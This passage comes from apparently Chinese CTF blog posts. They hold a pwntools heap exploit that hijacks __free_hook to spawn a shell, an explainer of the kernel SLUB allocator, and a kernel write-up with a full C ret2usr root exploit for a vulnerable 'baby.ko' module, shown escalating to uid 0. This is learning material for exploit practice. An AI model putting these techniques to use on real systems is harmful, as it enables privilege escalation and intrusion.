class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>(<span class="params">num_questions</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;enter the number of questions:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(num_questions))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_sorce</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">i,idx,size,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;which one? &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;please input the size of comment: &quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;enter your comment:\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;which student id to choose?&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>(<span class="params">i</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_mode</span>(<span class="params">i,content,score=<span class="number">100</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;enter your mode!\n&quot;</span>)</span><br><span class="line">        sh.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;enter your pray score: 0 to 100\n&quot;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(score))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;input your id: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class="line">    m=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nptr_add</span>(<span class="params">nptr</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(nptr))</span><br><span class="line"></span><br><span class="line">duan=<span class="string">&#x27;b *(0x7ffff7fc2000+&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1E45</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0xa0</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x350</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0xa0</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">1</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">2</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">3</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">4</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    give_sorce()</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    heap_base=get_addr()-<span class="number">0x2a0</span></span><br><span class="line">    nptr_add(heap_base+<span class="number">0x549</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_id(<span class="number">1</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    get_addr()</span><br><span class="line">    nptr_add(heap_base+<span class="number">0x441</span>)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    free_malloc=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    change_id(<span class="number">3</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    get_addr()</span><br><span class="line">    nptr_add(heap_base+<span class="number">0x8f1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xa0</span>+p64(<span class="number">0x460</span>)+p64(<span class="number">0x30</span>)+p64(heap_base+<span class="number">0x9e0</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0xfffffff700000001</span>)</span><br><span class="line">    pay+=p64(free_malloc)+p64(<span class="number">0x20</span>)</span><br><span class="line">    write_review(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x1a0</span>,pay)</span><br><span class="line">    write_review(<span class="number">1</span>,<span class="number">4</span>,<span class="number">0x20</span>,p64(libc_base+<span class="number">0xe3b31</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-总结"><a href="#0x4-总结" class="headerlink" title="0x4 总结"></a>0x4 总结</h2><p>感觉自己有点流于形式了，在看pwn1的时候一看到calloc就想着怎么绕过，完全没考虑程序本身，哎，所以浪费了很多时间，现在看来是一道比较简单的题，所以一切都要以程序为本，切记切记。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/08/slub-slab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/08/slub-slab/" class="post-title-link" itemprop="url">slub/slab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-08 17:20:10 / 修改时间：17:20:35" itemprop="dateCreated datePublished" datetime="2022-04-08T17:20:10+08:00">2022-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwn-slub-slab"><a href="#kernelpwn-slub-slab" class="headerlink" title="kernelpwn slub/slab"></a>kernelpwn slub/slab</h1><p>总结一波内核分配内存（堆）的策略，不然做内核题总是半懂不懂的。</p>
<p>内核管理内存页面使用了两种算法，伙伴算法和slub算法</p>
<h2 id="伙伴算法"><a href="#伙伴算法" class="headerlink" title="伙伴算法"></a>伙伴算法</h2><p>伙伴算法是以页4k为单位管理内存的，也就是申请和释放的最小单位是4k，但是程序多数情况下不会申请这么大的内存，而是比较小的内存，就像用户态的堆一样，所以还需要一个内存管理算法支持这种功能，也就是slub算法</p>
<h2 id="slub"><a href="#slub" class="headerlink" title="slub"></a>slub</h2><p>像libc申请释放堆块一样，slub也把堆进行进行了分组管理，每一组的大小是2^3,2^4….2^11字节，堆的大小是以8字节递增的，也就是(8,2048),当超过2048的时候就会使用伙伴系统提供的接口直接申请一个完整的页面，还有两个特殊的组96字节和192字节，这些组映射到kmalloc_caches[12]数组中的一个元素</p>
<p><img src="https://img.lhyerror404.cn/error404/2020-03-22-144151.png" alt="img"></p>
<p>这是用于slub管理内存的数据结构，可以看见每个kmalloc_caches元素又各种对应一个kmem_cache结构体，这个结构体中又能指向<code>kmem_cache_cpu</code>和<code>kmem_cache_node</code>两个数组，这两个结构体才是slub分配算法的关键</p>
<p>有一个博客比喻的很好，<code>kmem_cache_node</code>相当于仓库，<code>kmem_cache_cpu</code>是真正用于分配内存的地方，每个kmalloc_caches元素都有自己的<code>kmem_cache_cpu</code>和<code>kmem_cache_node</code>。</p>
<h3 id="kmem-cache-cpu和keme-cache-node"><a href="#kmem-cache-cpu和keme-cache-node" class="headerlink" title="kmem_cache_cpu和keme_cache_node"></a>kmem_cache_cpu和keme_cache_node</h3><p>slub会根据这个组的大小向伙伴算法申请整数倍4k的内存给kmem_cache_cpu,申请到这块内存叫做slab,其中kmem_cache_cpu.page就指向了slab的首地址，slub会根据这个组的大小把slab切割成很多个小的object,每个object的大小就是这个组的大小，当object还未被申请时候会有八个字节储存下一个object的地址，这样其实这个slab就被切割成大小相等的单向链表了，然后kmem_cache_cpu.freelist指向这个slab的第一个空闲object</p>
<p><img src="http://hi.csdn.net/attachment/201111/7/0_1320655427Rtw3.gif" alt="img"></p>
<p>当申请这个组的内存的时候如果这个组的kmem_cache_cpu没有一个slab的时候，slub就会申请一个slab并执行上述操作，然后把第一个obj标记为占用并返回给用户，下图体现了这个操作，申请了一个object以后kmem_cache_cpu就会根据这个object的next指向下一个空闲object。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220407214835446.png" alt="image-20220407214835446"></p>
<p>至于为什么说kmem_cache_cpu为什么是内存申请的主要地方现在就很明朗了。</p>
<p>可是kmem_cache_cpu指向的slab总有用完的时候，当这个slab用完怎么办，这时候就得用上<code>kmem_cache_node</code>这个结构体仓库了，kmem_cache_node有两个指针<code>partial</code>和<code>full</code>指向两个链表，其中partial指向有空闲obj的slab链表，full指向没有空闲的slab链表，如下图</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220407220144459.png" alt="image-20220407220144459"></p>
<p>当keme_cache_cpu指向的slab用完后就会放到kmem_cache_node.full上面，然后检查keme_cache_partial链表有没有有空闲的slab,如果有的话就会把第一个空闲的obj返回给用户，然后把这个slab给kmem_cache_cpu。</p>
<p>如果kmem_cache_node.full上面的一个slab的一个obj被释放后这个slab就会移向partial。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是slub算法的主要策略，不涉及源码解读（因为看不懂），先学着看，以后如果有必要会看看。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/08/kernelpwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-md/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/08/kernelpwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-md/" class="post-title-link" itemprop="url">kernelpwn刷题记录.md</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-08 17:19:04 / 修改时间：17:19:26" itemprop="dateCreated datePublished" datetime="2022-04-08T17:19:04+08:00">2022-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwn刷题记录"><a href="#kernelpwn刷题记录" class="headerlink" title="kernelpwn刷题记录"></a>kernelpwn刷题记录</h1><h2 id="0x1-level1"><a href="#0x1-level1" class="headerlink" title="0x1 level1"></a>0x1 level1</h2><h3 id="0x1-1-boot-sh"><a href="#0x1-1-boot-sh" class="headerlink" title="0x1.1 boot.sh"></a>0x1.1 boot.sh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>noksalr,nosmep,nosmap</p>
<h3 id="0x1-2-init"><a href="#0x1-2-init" class="headerlink" title="0x1.2 init"></a>0x1.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/baby</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>没有对proc/kallsyms保护</p>
<h3 id="0x1-3-baby-ko"><a href="#0x1-3-baby-ko" class="headerlink" title="0x1.3 baby.ko"></a>0x1.3 baby.ko</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD v5[<span class="number">17</span>]; <span class="comment">// [rsp-88h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x6001</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = v2;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)copy_from_user(v5, v3, <span class="number">256LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有栈溢出，直接ret2usr,使用kallsyms查看函数地址的时候发现地址全为0，百度后发现是内核的一种保护措施，只有root用户能够直接查看kallsyms，所以本地调试的时候把用户权限改大就好</p>
<p>提取vmlinux的命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/usr/src/linux-headers-$</span><span class="bash">(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br></pre></td></tr></table></figure>

<h3 id="0x1-4-exp"><a href="#0x1-4-exp" class="headerlink" title="0x1.4 exp"></a>0x1.4 exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810b9d80</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810b99d0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">     (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81070834</span>;</span><br><span class="line">    <span class="keyword">size_t</span> iretq=<span class="number">0xffffffff81036a5b</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">17</span>]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    rop[<span class="number">18</span>]=swapgs_pop_rbp_ret;</span><br><span class="line">    rop[<span class="number">20</span>]=iretq;</span><br><span class="line">    rop[<span class="number">21</span>]=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line">    rop[<span class="number">22</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">23</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">24</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">25</span>] = user_ss;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] bad open\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,<span class="number">0x6001</span>,rop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[*]status has ben saved.</span><br><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0</span><br></pre></td></tr></table></figure>

<h3 id="0x1-5-问题"><a href="#0x1-5-问题" class="headerlink" title="0x1.5 问题"></a>0x1.5 问题</h3><p>使用<code>add-symbol-file baby.ko 0x0</code>并不能断成功ko文件的函数，此时我们可以使用<code>lsmod</code>得知ko文件的首地址，然后利用具体地址断点，而不是通过函数名</p>
